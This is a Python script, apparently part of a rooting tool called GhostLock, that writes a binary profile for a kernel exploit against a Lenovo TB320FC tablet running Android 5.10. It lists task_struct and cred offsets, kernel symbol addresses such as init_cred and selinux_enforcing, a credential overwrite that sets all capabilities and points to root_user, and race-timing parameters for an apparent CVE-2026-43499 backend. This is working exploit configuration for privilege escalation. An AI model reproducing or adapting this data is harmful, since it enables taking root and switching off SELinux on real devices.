#!/usr/bin/env python3
"""把 TB320FC 的 GhostLock profil 编码成 native 端读取的 v2 二进制文档。

格式(见 ghostlock-app src/core/profile/binary.h):
  u32 magic(0x0D000721) u16 version(2) u16 frontend u16 backend u16 middleware(route)
  u16 release_len release  u16 section_count
  每段: u8 name_len name u32 entry_count, 每条: u8 key_len key u64 value
纯本地生成文件, 不接触设备。
"""
import os, struct

MAGIC = 0x0D000721
VERSION = 2
FRONTEND = 1                 # kFrontendRootChild
BACKEND = 1                  # kBackendCve202643499
ROUTE_SELECT_STACK = 2
RELEASE = "5.10.209-android12-9-gef44381c3e04-ab50"
M64 = (1 << 64) - 1

sections = []


def sec(name, kv):
    b = bytes([len(name)]) + name.encode() + struct.pack("<I", len(kv))
    for k, v in kv:
        b += bytes([len(k)]) + k.encode() + struct.pack("<Q", v & M64)
    sections.append(b)


# [img] = 从 stock boot.img 反汇编取证; [kmi] = android12-5.10 KMI 第 9 代冻结布局
sec("meta", [("kernel_major", 5), ("recommend_shizuku", 0),
             ("fallback_route", 0), ("safe_mode", 0)])
sec("task_struct", [
    ("prio", 132), ("normal_prio", 140), ("sched_task_group", 784),
    ("pi_lock", 2156), ("pi_waiters", 2176), ("pi_top_task", 2192),
    ("pi_blocked_on", 2200), ("pid", 1480), ("tgid", 1484),
    ("atomic_flags", 1424), ("real_cred", 1912), ("cred", 1920),
    ("comm", 1936), ("tasks", 1224), ("seccomp", 2120)])
sec("cred", [
    ("copy_size", 168), ("usage_offset", 0), ("usage_value", 1),
    ("caps_offset", 40), ("caps_count", 5), ("caps_value", -1),
    ("ref_count", 3),
    ("ref0_offset", 128), ("ref1_offset", 136), ("ref2_offset", 144),
    ("ref0_image", 0xFFFFFFC00A7BF660),   # root_user
    ("ref1_image", 0xFFFFFFC00A7BF6F8),   # init_user_ns
    ("ref2_image", 0xFFFFFFC00A7C0B88)])  # init_groups
sec("offset", [
    ("init_task", 41598656), ("init_cred", 41683680),
    ("empty_zero_page", 43638784), ("root_task_group", 43659328),
    ("selinux_enforcing", 44379112), ("selinux_blob_sizes", 36673016),
    ("security_hook_heads", 36671336),
    ("slide_nfulnl_logger", 41554848), ("slide_loggers_0_1", 41554648),
    ("slide_boot_id", 44506165)])
sec("kernel", [
    ("kernel_phys_load", 0xA8000000), ("kernel_phys_offset", 0x80000000),
    ("compact_waiter", 1), ("kernelsnitch_collisions", 4), ("mm_struct_sz", 960)])
sec("execution.recommended_cpus", [("main", 0), ("consumer", 1)])
sec("execution.heap", [("prepare_max_attempts", 8), ("prepare_timeout_ms", 240000),
                       ("kernelsnitch_timeout_ms", 60000)])
sec("execution.race", [("route_wait_ms", 1000), ("route_done_timeout_ms", 300000),
                       ("setup_settle_us", 50000), ("state_poll_interval_us", 1000)])
sec("execution.stages", [("w1_attempts", 15), ("w1_settle_us", 100000),
                         ("w1_scratch_repair_attempts", 3),
                         ("w2_attempts", 15), ("w2_settle_us", 100000),
                         ("w3_chain_rounds", 3), ("w3_attempts", 6),
                         ("w3_settle_us", 50000)])
sec("execution.handoff", [("pre_dispatch_settle_ms", 2000), ("module_poll_attempts", 30),
                          ("module_poll_interval_ms", 100),
                          ("enforce_poll_attempts", 200),
                          ("enforce_poll_interval_ms", 100)])
sec("execution.consumer", [("max_calls", 1), ("burst_calls", 1)])
SEC = int(os.environ.get("SEED", "50000"))
sec("route.select_stack", [("waiter_shift", -2), ("compact_waiter", 1),
                           ("enter_delay_us", SEC), ("timeout_us", 200000)])

# 头部 16 字节: 4+2+2+2+2+2 = 14, 末尾 2 字节保留(kHeaderSize=16), release 从 offset 16 开始
doc = struct.pack("<IHHHHHH", MAGIC, VERSION, FRONTEND, BACKEND,
                  ROUTE_SELECT_STACK, len(RELEASE), 0) + RELEASE.encode()
doc += struct.pack("<H", len(sections)) + b"".join(sections)
out = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tb320fc.bin")
open(out, "wb").write(doc)
print("wrote", out, len(doc), "bytes,", len(sections), "sections")
